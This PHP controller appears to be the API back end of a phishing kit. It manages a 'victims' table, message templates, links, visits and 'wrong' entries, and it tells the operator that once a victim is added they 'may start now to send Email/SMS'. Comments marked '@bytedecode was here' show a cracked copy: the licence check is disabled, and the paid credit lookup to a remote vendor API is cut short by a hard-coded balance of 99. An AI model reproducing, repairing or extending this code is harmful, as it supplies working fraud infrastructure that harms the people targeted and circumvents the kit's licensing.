<?php
class Api extends MY_Controller
{
    public static $global = NULL;
    public function __construct()
    {
        parent::__construct();
        $this->load->library("Ajax", false);
        self::$global = (object) $this->global_data;
        if (!isset($this->goptss)) {
            //<-@bytedecode was here
            //exit;
        }
        $this->load->model("visit_m", "vistor");
        $this->load->model("device_m", "devices");
        $this->load->model("links_m", "links");
        $this->load->model("template_m", "temp");
        $this->load->model("victim_m", "victims");
        $this->load->model("wrong_m", "wrong");
        $this->load->model("Api_m", "api");
    }
    public function check($apikey = NULL)
    {
        header("Content-type: application/json");
        header("Access-Control-Allow-Origin: *");
        $apikey == self::$global->senderKitAPI ? Ajax::success("true", 200) : Ajax::error("Api key is invalid please make sure ur using the right one!", 200);
    }
    public function init()
    {
        $this->form_validation->set_rules("api", "API Key", "required|trim");
        $this->form_validation->set_rules("ip", "IP Address", "required|trim", array("required" => "%s is required sorry"));
        if (!$this->checkifexist($this->input->ip_address())) {
            echo json_encode(array("status" => false, "msg" => "Your Access need to be activate or approval first!"));
            exit;
        }
        if ($this->form_validation->run() == true) {
            $request = $this->input->post("request", true);
            if (!method_exists("Api", $request)) {
                echo json_encode(array("status" => false, "msg" => "Non Request called, Please insure you know what you doing?"));
                exit;
            }
            $para = array("func" => $this->input->post("func", true), "data" => $this->input->post("data", true));
            echo json_encode($this->{$request}($para));
        } else {
            echo json_encode(array("status" => false, "msg" => validation_errors("{", "},")));
        }
    }
    public function checkifexist($ip)
    {
        $getip = $this->api->getby("deviceIP", $ip);
        $getipand = $this->api->getByAnd(array("deviceIP" => $ip, "status" => 1));
        if ($getip) {
            if ($getipand) {
                return true;
            }
            return false;
        }
        $data = array("deviceName" => $this->agent->browser(), "deviceOS" => $this->agent->platform(), "deviceIP" => $this->input->ip_address(), "status" => 0);
        $this->api->insert($data);
        return false;
    }
    public function victims($para)
    {
        switch ($para["func"]) {
            case "getall":
                return array("status" => true, "msg" => $this->victims->getAll());
            case "getby":
                return array("status" => true, "msg" => $this->victims->getByUser($para["data"]["id"]));
            case "addnew":
                $addnew = $this->victims->insert($para["data"]);
                return $addnew ? array("status" => true, "msg" => "Victim have been added you may start now to send Email/SMS.") : array("status" => false, "msg" => "Something goes wrong please try.");
        }
        return array("status" => false, "msg" => "Non function called, Please insure you know what you doing?");
    }
    public function Credit($id = NULL)
    {
        //<< @bytedecode was here
		$data = array( "credit" => 99 );
        $this->session->set_userdata($data);
        AJAX::success($msg, 200);
		exit();
        //>>
        
        $key = $this->global_data["master_api_key"];
        $params = array("api_key" => $key);
        $cl = curl_init("http://nemoz.net/API/credit");
        curl_setopt_array($cl, array(CURLOPT_TIMEOUT => 180, CURLOPT_CONNECTTIMEOUT => 180, CURLOPT_SSL_VERIFYPEER => false, CURLOPT_FOLLOWLOCATION => true, CURLOPT_RETURNTRANSFER => true, CURLOPT_AUTOREFERER => true, CURLOPT_VERBOSE => false, CURLOPT_POST => true, CURLOPT_POSTFIELDS => $params));
        $req = curl_exec($cl);
        if ($id == NULL) {
            AJAX::error(json_decode($req));
        } else {
            $msg = json_decode($req);
            $data = array("credit" => $msg->msg->credit);
            $this->session->set_userdata($data);
            AJAX::success($msg, 200);
        }
    }
}

?>